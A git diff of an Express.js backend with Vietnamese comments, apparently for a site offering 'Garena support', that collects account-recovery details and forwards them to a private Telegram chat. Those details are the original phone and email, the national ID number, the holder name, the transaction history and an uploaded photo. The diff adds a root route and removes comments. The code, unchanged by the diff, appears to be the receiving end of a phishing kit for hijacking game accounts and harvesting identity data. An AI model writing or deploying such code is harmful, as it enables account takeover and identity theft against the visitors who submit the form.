@@ -2,7 +2,7 @@
  * Backend Server cho Ứng dụng Hỗ trợ Garena
  * @author Dev TanPhat (Professional Coder)
  * @date 2025-11-05
- * Đã sửa lỗi Vercel Read-Only File System
+ * Đã sửa lỗi Vercel Read-Only & Cannot GET /
  */
 
 // --- Import Dependencies ---
@@ -17,7 +17,6 @@ require('dotenv').config();
 // --- Application Constants ---
 const app = express();
 const PORT = 3000;
-// [SỬA LỖI VERCEL] Dùng thư mục /tmp (thư mục duy nhất có thể ghi)
 const UPLOAD_DIR = '/tmp/uploads_tanphat';
 
 // --- Security & Bot Configuration ---
@@ -26,11 +25,9 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // --- Storage Engine (Multer) ---
-// Đảm bảo thư mục upload tạm tồn tại
 if (!fs.existsSync(UPLOAD_DIR)){
-    fs.mkdirSync(UPLOAD_DIR, { recursive: true }); // Thêm recursive để tạo thư mục an toàn
+    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
 }
-// Cấu hình cách lưu file
 const storage = multer.diskStorage({
     destination: (req, file, cb) => cb(null, UPLOAD_DIR + '/'),
     filename: (req, file, cb) => {
@@ -45,7 +42,14 @@ app.use(express.static(path.join(__dirname)));
 app.use(express.json()); 
 app.use(express.urlencoded({ extended: true }));
 
+
 // --- API Endpoints ---
+
+// [MỚI] Bắt lỗi "Cannot GET /"
+// Phải bảo server gửi file index.html khi truy cập trang chủ
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
 
 /**
  * [POST] /verify-key
@@ -73,7 +77,6 @@ app.post('/submit-form', upload.single('attachment'), (req, res) => {
 
     console.log("=====================================");
     console.log("🔥 YÊU CẦU HỖ TRỢ MỚI VỪA VỀ! 🔥");
-    console.log("--- Dữ liệu Form (Text): ---");
     console.log(textData);
     if (fileData) console.log(`(File đã lưu tại: ${fileData.path})`);
     console.log("=====================================");
@@ -92,7 +95,7 @@ app.post('/submit-form', upload.single('attachment'), (req, res) => {
  * Gửi thông báo đến Telegram
  */
 async function sendTelegramNotification(textData, fileData) {
-    
+
     const message = formatTelegramMessage(textData);
     const telegramApi = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
@@ -101,18 +104,17 @@ async function sendTelegramNotification(textData, fileData) {
             // --- Kịch bản 1: Gửi Ảnh + Caption ---
             const url = `${telegramApi}/sendPhoto`;
             const form = new FormData();
-            
+
             form.append('chat_id', TELEGRAM_CHAT_ID);
             form.append('caption', message);
             form.append('parse_mode', 'HTML');
-            form.append('photo', fs.createReadStream(fileData.path)); // Đọc file ảnh từ /tmp
+            form.append('photo', fs.createReadStream(fileData.path));
 
             await axios.post(url, form, {
                 headers: form.getHeaders()
             });
             console.log("[TELEGRAM] Gửi ảnh và thông báo thành công!");
 
-            // [QUAN TRỌNG] Xóa file tạm sau khi gửi
             fs.unlink(fileData.path, (err) => {
                 if (err) console.error("Không xóa được file tạm:", err);
             });
@@ -141,13 +143,11 @@ async function sendTelegramNotification(textData, fileData) {
  * Định dạng nội dung tin nhắn Telegram
  */
 function formatTelegramMessage(data) {
-    // [SỬA LỖI] Kiểm tra data tồn tại
     const f = (field) => (data && data[field]) ? data[field] : '';
 
     let msg = `<b>🔥 Yêu cầu Hỗ trợ Mới - Dev TanPhat 🔥</b>\n\n`;
     msg += `<b>Tên đăng nhập Garena:</b> <pre>${f('garena-id')}</pre>\n`;
     msg += `<b>Ngày mất TK:</b> ${f('date-lost')}\n\n`;
-
     msg += `<b>--- Thông tin xác thực gốc ---</b>\n`;
     msg += `<b>SĐT đầu tiên:</b> <pre>${f('first-phone')}</pre>\n`;
     msg += `<b>Email đầu tiên:</b> <pre>${f('first-email')}</pre>\n`;
@@ -156,21 +156,16 @@ function formatTelegramMessage(data) {
     msg += `<b>CCCD trong TK:</b> <pre>${f('account-cccd')}</pre>\n`;
     msg += `<b>Họ tên trong TK:</b> <pre>${f('account-name')}</pre>\n`;
     msg += `<b>Giao dịch nạp:</b>\n<pre>${f('transactions')}</pre>\n\n`;
-
     msg += `<b>--- Thông tin liên hệ (Khách) ---</b>\n`;
     msg += `<b>Họ tên:</b> ${f('contact-name')}\n`;
     msg += `<b>Email:</b> <pre>${f('contact-email')}</pre>\n`;
     msg += `<b>SĐT:</b> <pre>${f('contact-phone')}</pre>\n`;
     msg += `<b>CCCD (để cập nhật):</b> <pre>${f('contact-cccd')}</pre>\n\n`;
-    
     msg += `<b>--- Chi tiết vấn đề ---</b>\n`;
     msg += `<pre>${f('description')}</pre>\n`;
-
     return msg;
 }
 
-
 // --- Server Initialization ---
-// Vercel sẽ tự động lắng nghe, không cần app.listen() ở đây
 // XUẤT app cho Vercel chạy
 module.exports = app;
